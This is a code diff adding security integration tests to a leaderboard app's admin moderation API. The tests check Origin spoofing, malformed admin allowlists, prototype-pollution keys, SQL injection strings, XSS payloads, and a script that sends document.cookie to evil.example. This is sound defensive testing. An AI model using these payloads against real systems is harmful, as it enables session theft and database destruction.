@@ -23,7 +23,7 @@ vi.mock("@/lib/groups/cache", () => ({ revalidateUserGroupLeaderboards: vi.fn() 
 vi.mock("@/lib/leaderboard/getLeaderboard", () => ({ getLeaderboardData: vi.fn(async () => ({})) }));
 
 import { POST } from "@/app/api/submit/route";
-import { POST as moderate } from "@/app/api/admin/moderation/[username]/route";
+import { GET as getModerationUser, POST as moderate } from "@/app/api/admin/moderation/[username]/route";
 import { GET as getCandidates } from "@/app/api/admin/moderation/candidates/route";
 import { applyModerationAction, findModerationTarget, getModerationHistory } from "@/lib/moderation/actions";
 import { getModerationCandidates } from "@/lib/moderation/candidates";
@@ -257,5 +257,117 @@ describeWithPostgres("submission security PostgreSQL integration", () => {
     const history = await getModerationHistory(target.id);
     expect(history).toHaveLength(1);
     expect(history[0]).toMatchObject({ action: "hide", actorUsername: admin.username });
+  });
+
+  it("rejects missing, null, prefix-spoofed, and port-mismatched Origin headers on mutating admin requests", async () => {
+    const admin = await account();
+    const target = await account();
+    vi.stubEnv("TOKSCALE_ADMIN_GITHUB_IDS", String(admin.githubId));
+    state.cookie = await webSession(admin);
+
+    const missingOriginReq = new Request(`http://localhost/api/admin/moderation/${target.username}`, {
+      method: "POST",
+      headers: { "content-type": "application/json", referer: "http://localhost/admin/moderation" },
+      body: JSON.stringify({ action: "hide", reason: "Under investigation" }),
+    });
+    expect((await moderate(missingOriginReq, { params: Promise.resolve({ username: target.username }) })).status).toBe(404);
+
+    for (const badOrigin of [
+      "null",
+      "http://localhost.attacker.example",
+      "http://attacker.example/http://localhost",
+      "http://localhost:9999",
+      "https://localhost",
+    ]) {
+      expect((await moderateRequest(target.username, badOrigin)).status).toBe(404);
+    }
+    expect(await getModerationHistory(target.id)).toEqual([]);
+  });
+
+  it("fails closed when TOKSCALE_ADMIN_GITHUB_IDS contains malformed or non-positive entries", async () => {
+    const admin = await account();
+    const target = await account();
+    state.cookie = await webSession(admin);
+
+    for (const malformedAllowlist of [
+      "0",
+      "-1",
+      `0x${admin.githubId.toString(16)}`,
+      `${admin.githubId},not-a-number`,
+      `${admin.githubId},0`,
+      `${admin.githubId},-42`,
+    ]) {
+      vi.stubEnv("TOKSCALE_ADMIN_GITHUB_IDS", malformedAllowlist);
+      expect((await moderateRequest(target.username)).status).toBe(404);
+      expect((await getCandidates(new Request("http://localhost/api/admin/moderation/candidates"))).status).toBe(404);
+    }
+    expect(await getModerationHistory(target.id)).toEqual([]);
+  });
+
+  it("tolerates prototype-pollution keys, SQL payloads, and hostile JSONB shapes without SQL errors or XSS execution", async () => {
+    const admin = await account();
+    const a = await account();
+    vi.stubEnv("TOKSCALE_ADMIN_GITHUB_IDS", String(admin.githubId));
+    state.cookie = await webSession(admin);
+
+    for (const hostileModel of [
+      "__proto__",
+      "constructor",
+      "prototype",
+      "fake-model\" onmouseover=\"alert(1)\" <script>alert(1)</script>",
+      "gpt-99'; SELECT pg_sleep(5); --",
+    ]) {
+      const data = payload(hostileModel);
+      data.device = { id: "security-device", name: "<img src=x onerror=alert(1)>'; DROP TABLE submitted_devices; --" };
+      expect((await submit(a.token, data)).status).toBe(200);
+    }
+
+    // Inject hostile non-numeric and SQL-meta values directly into JSONB to verify
+    // candidate CTE regex guards and jsonb_typeof checks prevent 22P02 cast crashes.
+    const sql = database();
+    await sql`
+      UPDATE daily_breakdown
+      SET source_breakdown = source_breakdown || jsonb_build_object(
+        'cursor', jsonb_build_object(
+          'tokens', '1; DROP TABLE users;--',
+          'cost', 'Infinity',
+          'modelId', 'premium-tool-call',
+          'models', jsonb_build_object(
+            'premium-tool-call', jsonb_build_object('tokens', 'NaN', 'cost', '1e999999')
+          )
+        ),
+        'opencode', (source_breakdown->'opencode') || jsonb_build_object(
+          'messages', '0; DROP TABLE moderation_actions;--'
+        )
+      )
+      WHERE submission_id = (SELECT id FROM submissions WHERE user_id = ${a.id})
+    `;
+
+    const candidatesRes = await getCandidates(new Request("http://localhost/api/admin/moderation/candidates"));
+    expect(candidatesRes.status).toBe(200);
+    expect(candidatesRes.headers.get("content-type")).toContain("application/json");
+    const candidatesBody = await candidatesRes.json();
+    const candidate = candidatesBody.candidates.find((c: { userId: string }) => c.userId === a.id);
+    expect(candidate).toBeDefined();
+
+    const xssReason = "<script>fetch('https://evil.example?c='+document.cookie)</script>";
+    const modRes = await moderate(
+      new Request(`http://localhost/api/admin/moderation/${a.username}`, {
+        method: "POST",
+        headers: { origin: "http://localhost", "content-type": "application/json" },
+        body: JSON.stringify({ action: "hide", reason: xssReason }),
+      }),
+      { params: Promise.resolve({ username: a.username }) }
+    );
+    expect(modRes.status).toBe(200);
+
+    const historyRes = await getModerationUser(
+      new Request(`http://localhost/api/admin/moderation/${a.username}`),
+      { params: Promise.resolve({ username: a.username }) }
+    );
+    expect(historyRes.status).toBe(200);
+    expect(historyRes.headers.get("content-type")).toContain("application/json");
+    const historyBody = await historyRes.json();
+    expect(historyBody.history[0].reason).toBe(xssReason);
   });
 });
